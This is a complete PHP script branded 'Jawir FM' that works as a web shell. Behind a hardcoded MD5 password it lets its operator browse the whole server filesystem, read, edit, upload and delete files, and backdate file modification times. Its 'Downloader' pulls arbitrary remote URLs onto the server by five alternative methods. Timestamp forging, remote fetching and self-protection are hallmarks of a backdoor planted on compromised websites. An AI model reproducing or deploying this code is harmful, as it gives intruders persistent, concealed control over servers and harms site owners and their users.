<?php
session_start();
$password = defined('PW') ? PW : '0192023a7bbd73250516f069df18b500';
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
        $_SESSION['logged_in'] = true; header('Location:'); exit;
    }
    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" placeholder="Password" class="border px-2"> <button class="bg-green-500 text-white px-2">Login</button></form></body></html>'; exit;
}

// Path
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$parent = dirname($path);

// Handle sort preference
if(isset($_GET['sort'])) $_SESSION['sort']=$_GET['sort'];
if(isset($_GET['order'])) $_SESSION['order']=$_GET['order'];
$sort = $_SESSION['sort'] ?? 'name';
$order = $_SESSION['order'] ?? 'asc';

// Handle search
$search = $_GET['search'] ?? '';

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    try {
        $self = basename(__FILE__);
        if (isset($_POST['get_content'])) {
            $f = basename($_POST['get_content']);
            if ($f == $self) {
                echo 'Author @willygoid';
            } else {
                $file = $path.'/'.$f;
                if (is_file($file)) {
                    echo file_get_contents($file);
                } else {
                    echo '';
                }
            }
            exit;
        }
        elseif (isset($_POST['new_folder'])){
            mkdir($path.'/'.basename($_POST['new_folder']));
            $_SESSION['msg']='Folder created'; $_SESSION['msg_type']='success';
        }
        elseif (isset($_POST['new_file'])){
            $new = basename($_POST['new_file']);
            if($new==$self){
                $_SESSION['msg']='Cannot overwrite file manager itself'; $_SESSION['msg_type']='error';
            } else {
                file_put_contents($path.'/'.$new, '');
                $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
            }
        }
        elseif (isset($_POST['delete'])){
            $t=basename($_POST['delete']);
            if($t==$self){
                $_SESSION['msg']='Cannot delete file manager itself'; $_SESSION['msg_type']='error';
            } else {
                $target=$path.'/'.$t;
                if(is_dir($target)?rmdir($target):unlink($target)){
                    $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
                } else $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error';
            }
        }
        elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
            if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
                $_SESSION['msg']='Renamed successfully'; $_SESSION['msg_type']='success';
            } else $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error';
        }
        elseif (isset($_POST['edit_file'],$_POST['content'])){
            $edit = basename($_POST['edit_file']);
            if($edit==$self){
                $_SESSION['msg']='Cannot edit file manager itself'; $_SESSION['msg_type']='error';
            } else {
                if(file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
                    $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
                } else $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error';
            }
        }
        elseif (isset($_FILES['files'])){
            $ok=0;
            foreach($_FILES['files']['tmp_name'] as $i=>$tmp)
                if(move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
            $_SESSION['msg']= $ok.' file(s) uploaded'; $_SESSION['msg_type']='success';
        }
        elseif (isset($_POST['update_mtime'],$_POST['mtime_value'])){
            $file=$path.'/'.basename($_POST['update_mtime']);
            if(@touch($file, strtotime($_POST['mtime_value']))){
                $_SESSION['msg']='Modified time updated'; $_SESSION['msg_type']='success';
            } else $_SESSION['msg']='Update failed'; $_SESSION['msg_type']='error';
        }
        elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])){
            $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
            $ok=false;
            switch($method){
                case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
                case 'copy': $ok=@copy($url,$out); break;
                case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf); $ok=true;} break;
                case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
                case 'curl': $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
            }
            $_SESSION['msg']= $ok?'Download success':'Download failed'; $_SESSION['msg_type']=$ok?'success':'error';
        }
    } catch(Exception $e){ $_SESSION['msg']='Error: '.$e->getMessage(); $_SESSION['msg_type']='error'; }
    header('Location: '.$_SERVER['REQUEST_URI']); exit;
}

// Scan dir
$files=scandir($path);
$folders=[];$regular_files=[];
foreach($files as $f){
    if($f=='.'||$f=='..')continue;
    if($search && stripos($f,$search)===false) continue;
    $fp=$path.'/'.$f; $mtime=filemtime($fp);
    if(is_dir($fp)) $folders[]= ['name'=>$f,'mtime'=>$mtime];
    else $regular_files[]= ['name'=>$f,'mtime'=>$mtime];
}

// Sort
$sort_func = function($a,$b)use($sort,$order){
    if($sort=='mtime') return $order=='asc' ? $a['mtime']<=>$b['mtime'] : $b['mtime']<=>$a['mtime'];
    else return $order=='asc' ? strcasecmp($a['name'],$b['name']) : strcasecmp($b['name'],$a['name']);
};
usort($folders,$sort_func); usort($regular_files,$sort_func);

// URL builder
function toggle_order($c){return $c=='asc'?'desc':'asc';}
function sort_url($by,$cs,$co,$p,$s){$o=($by==$cs)?toggle_order($co):'asc'; return "?path=".urlencode($p)."&sort=$by&order=$o&search=".urlencode($s);}

//Breadcrumbs
$parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
$breadcrumbs = [];
$build = DIRECTORY_SEPARATOR;
foreach ($parts as $part) {
    if ($part === '') continue;
    $build .= $part . DIRECTORY_SEPARATOR;
    $breadcrumbs[] = ['name'=>$part, 'path'=>$build];
}

// Goto Dir
$self_dir = dirname(realpath(__FILE__));
$docroot = realpath($_SERVER['DOCUMENT_ROOT']);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>File Manager Pro</title>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<script>
$(function(){
    $('.edit-btn').click(function(){ let f=$(this).data('file'); $('.edit-filename').text(f); $.post('',{get_content:f},d=>{$('#editModal textarea').val(d);$('#editModal input[name="edit_file"]').val(f);$('#editModal').removeClass('hidden');});});
    $('.delete-btn').click(function(){ $('#deleteModal input[name="delete"]').val($(this).data('file')); $('#deleteModal span').text($(this).data('file')); $('#deleteModal').removeClass('hidden');});
    $('.rename-btn').click(function(){ $('#renameModal input[name="rename_from"]').val($(this).data('file')); $('#renameModal input[name="rename_to"]').val($(this).data('file')); $('#renameModal').removeClass('hidden');});
    $('.mtime-btn').click(function(){ let f=$(this).data('file'); let dt=$(this).data('mtime'); $('#mtimeModal input[name="update_mtime"]').val(f); $('#mtimeModal input[name="mtime_value"]').val(dt); $('#mtimeModal span').text(f); $('#mtimeModal').removeClass('hidden');});
    $('#showNewFile').click(()=>$('#newFileModal').removeClass('hidden'));
    $('#showNewFolder').click(()=>$('#newFolderModal').removeClass('hidden'));
    $('#showDownloader').click(()=>$('#downloaderModal').removeClass('hidden'));
    $('#uploadBtn').click(()=>$('#uploadInput').click());
    $('.close').click(()=>$('.modal').addClass('hidden'));
    $('#uploadInput').change(()=>$('#uploadForm').submit());
});
</script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
</head>
<body class="bg-gray-100">
<header class="container mx-auto flex items-center justify-between p-4">
    <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">Jawir FM</h1>
    <a href="#" target="_blank" class="flex items-center">
    <img alt="Logo App" class="h-8 md:h-12" src="//i.postimg.cc/Kc6D2ry7/joshoki-rezized.webp"/>
    </a>
</header>
<main role="main" class="container mx-auto mb-4">
<nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
  <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
    <li class="inline-flex items-center">
      <a href="?path=/" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-3 h-3 me-2.5" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20">
          <path d="m19.707 9.293-2-2-7-7a1 1 0 0 0-1.414 0l-7 7-2 2a1 1 0 0 0 1.414 1.414L2 10.414V18a2 2 0 0 0 2 2h3a1 1 0 0 0 1-1v-4a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1v4a1 1 0 0 0 1 1h3a2 2 0 0 0 2-2v-7.586l.293.293a1 1 0 0 0 1.414-1.414Z"/>
        </svg>
      </a>
    </li>
    <?php foreach($breadcrumbs as $i => $crumb): ?>
    <li class="inline-flex items-center">
      <svg xmlns="http://www.w3.org/2000/svg" class="rtl:rotate-180 block w-3 h-3 mx-1 text-gray-400 " aria-hidden="true" fill="none" viewBox="0 0 6 10">
        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 9 4-4-4-4"/>
      </svg>
      <?php if($i < count($breadcrumbs)-1): ?>
      <a href="?path=<?=urlencode(rtrim($crumb['path'],'/'))?>" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
        <?=htmlspecialchars($crumb['name'])?>
      </a>
      <?php else: ?>
      <span class="ms-1 text-sm font-medium text-gray-500 md:ms-2"><?=htmlspecialchars($crumb['name'])?></span>
      <?php endif;?>
    </li>
    <?php endforeach; ?>
  </ol>
</nav>
</main>
<div class="container mx-auto p-4 bg-white rounded-lg shadow">
    <div class="flex justify-between mb-4">
    <div class="flex space-x-2">
    <?php if($path!=$parent):?>
    <a href="?path=<?=urlencode($parent)?>" class="bg-gray-300 px-2 py-1 rounded">⬅️ Up</a>
    <?php endif;?>
    <a href="?path=<?=urlencode($docroot)?>" class="bg-gray-300 px-2 py-1 rounded">🏠 Root</a>
    <a href="?path=<?=urlencode($self_dir)?>" class="bg-gray-300 px-2 py-1 rounded">📂 FM Dir</a>
    </div>    
    <div class="flex space-x-2">
    <form method="get" class="flex space-x-1"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
    <button id="showDownloader" class="bg-purple-500 text-white px-2 py-1 rounded">⬇️ Downloader</button>
    <button id="showNewFolder" class="bg-green-500 text-white px-2 py-1 rounded">📁 New Folder</button>
    <button id="showNewFile" class="bg-green-500 text-white px-2 py-1 rounded">📄 New File</button>
    <form method="post" enctype="multipart/form-data" id="uploadForm" class="inline">
    <input type="file" name="files[]" multiple id="uploadInput" class="hidden">
    <button type="button" id="uploadBtn" class="bg-blue-500 text-white px-2 py-1 rounded">⬆️ Upload</button>
    </form>
    </div></div>

    <table class="min-w-full bg-white border">
    <tr class="bg-gray-200">
    <th class="p-2 text-left"><a href="<?=sort_url('name',$sort,$order,$path,$search)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
    <th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
    <th class="p-2">Action</th></tr>
    <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
    <tr class="border-t">
    <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500 underline">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
    <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button></td></tr><?php endforeach;?>
    </table>
</div>

<!-- Modals -->
<div id="editModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 w-1/2 rounded">
<h2 class="text-xl mb-2">✏️ Edit: <span class="edit-filename text-blue-600"></span></h2>
<form method="post"><input type="hidden" name="edit_file">
<textarea name="content" class="w-full h-96 border mb-2 font-mono"></textarea>
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">💾 Save</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Close</button></div>
</form></div></div>

<div id="deleteModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post"><p>Delete <span class="font-bold"></span> ?</p><input type="hidden" name="delete">
<div class="flex justify-between mt-2"><button class="bg-red-500 text-white px-4 py-1 rounded">🗑️ Delete</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="renameModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="rename_from">
<p>New name:</p><input name="rename_to" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">↩️ Rename</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="newFileModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>File name:</p><input name="new_file" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📄 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="newFolderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>Folder name:</p><input name="new_folder" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📁 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="mtimeModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_mtime">
<p>Edit Last Modified of <span class="font-bold"></span>:</p>
<input type="datetime-local" name="mtime_value" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">⏰ Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="downloaderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>URL Source:</p><input name="download_url" class="border px-2 mb-2 w-full"><p>Output Name:</p><input name="output_name" class="border px-2 mb-2 w-full"><p>Method:</p><select name="method" class="border px-2 mb-2 w-full"><option>file_get_contents</option><option>cURL</option><option>fopen</option><option>copy</option><option>stream_context</option></select>
<div class="flex justify-between"><button class="bg-purple-500 text-white px-4 py-1 rounded">⬇️ Download</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<footer class="container mx-auto p-4">
      <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
        <div class="flex-grow lg:w-1/2 text-gray-600">
              <?=date('Y');?> - <a href="https://www.github.com/willygoid" target="_blank" class="text-blue-700 hover:text-blue-500">@willygoid</a></div>
        <div class="flex-grow lg:w-1/2 text-gray-600 text-right">
          <p class="font-bold">v0.1</p>
        </div>
      </div>
</footer>

<?php if(isset($_SESSION['msg'])): ?>
<script>
toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
</script>
<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>

</body></html>
